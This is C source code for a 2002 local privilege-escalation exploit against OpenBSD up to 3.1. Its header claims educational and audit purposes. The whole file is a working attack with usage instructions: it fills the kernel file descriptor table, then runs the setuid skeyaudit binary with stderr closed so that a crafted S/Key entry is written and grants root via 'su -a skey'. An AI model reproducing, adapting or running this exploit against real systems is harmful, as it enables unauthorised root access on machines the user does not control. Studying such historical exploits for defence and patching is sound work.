/*        fd_openbsd.c
   (c) 2002 FozZy <fozzy@dmpfrance.com>
  Local root exploit for OpenBSD up to 3.1. Do not distribute.
 Research material from Hackademy and Hackerz Voice Newspaper (http://www.hackerzvoice.com)
 For educational and security audit purposes only. Try this on your *own* system.
 No warranty of any kind, this program may damage your system and your brain.
 Script-kiddies, you will have to modify one or two things to make it work.

 Usage:
   gcc -o fd fd_openbsd.c
   ./fd
   su -a skey
*/

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <fcntl.h>

#define SUID_NAME "/usr/bin/skeyaudit"
#define SKEY_DATA "\nr00t md5 0099 qwerty        545a54dde8d3ebd3  Apr 30,2002 22:47:00\n";
extern int errno;

int main(int argc, char **argv) {
  char *argvsuid[3];
  int i, n;
  int fildes[2];
  struct rlimit *rlp;

  rlp = (struct rlimit *) malloc((size_t) sizeof(rlp));
  if (getrlimit(RLIMIT_NOFILE, rlp))
    perror("getrlimit");
  rlp->rlim_cur = rlp->rlim_max;  /* we want to allocate a maximum number of fd in each process */
  if (setrlimit(RLIMIT_NOFILE, rlp))
    perror("setrlimit");
 
  n=0;
  open(SUID_NAME, O_RDONLY, 0);/* is it useful ? allocate this file in the kernel fd table, for execve to succeed later*/

  while (n==0) {
    for (i=4; i<=rlp->rlim_cur; i++) /* we start from 4 to avoid freeing the SUID_NAME buffer, assuming its fd is 3 */
      close(i);
    i=0;
    while(pipe(fildes)==0)  /* pipes are the best way to allocate unique file descriptors quickly */
      i++;
    printf("Error number %d : %s\n", errno, (errno==ENFILE) ? "System file table full":"Too many descriptors active for this process");
    if (errno==ENFILE) {    /* System file table full */
      n = open("/bin/pax", O_RDONLY, 0); /* To be sure we don't miss one fd, since a pipe allocates 2 fds or 0 if failure */
      fprintf(stderr, "Let's exec the suid binary...\n");
      fflush(stderr);
      if ((n=fork())==-1) {
	 perror("last fork failed");
	 exit(1);
      }
      if (n==0) {
	 for (i=3; i<=rlp->rlim_cur; i++)
	   close(i);   /* close all fd, we don't need to fill the fd table of the process */
	 argvsuid[0]=SKEY_DATA;  /* we put the data to be printed on stderr as the name of the program */
	 argvsuid[1]="-i"; /* to make skeyaudit fail with an error */
	 argvsuid[2]=NULL;
         close(2);  /* let the process exec'ed have stderr as the *first* fd free */
	 execve(SUID_NAME, argvsuid, NULL);
	 perror("execve");
	 exit(1);
      }
      else {
	 for (i=0; i<2000000; i++)   /* Timing is crucial : tune this to your own system */
	   ;
	 for (i=4; i<=100; i++) /* free some fd for the suid file to execute normally (ld.so, etc.) */
	   close(i);
	 sleep(5);
         for (i=3; i<=rlp->rlim_cur; i++)
           close(i);
	 exit(0);
      }
    }
    else {    /* process table full, let's fork to allocate more fds */
      if ((n=fork()) == -1) {
	 perror("fork failed");
	 exit(1);
      }
    }
  }
  printf("Number of pipes opened by parent: %d\n",i);
  sleep(5);
  for (i=3; i<=rlp->rlim_cur; i++)
    close(i);
  fprintf(stderr,"Exiting...\n");
  exit(0);
}


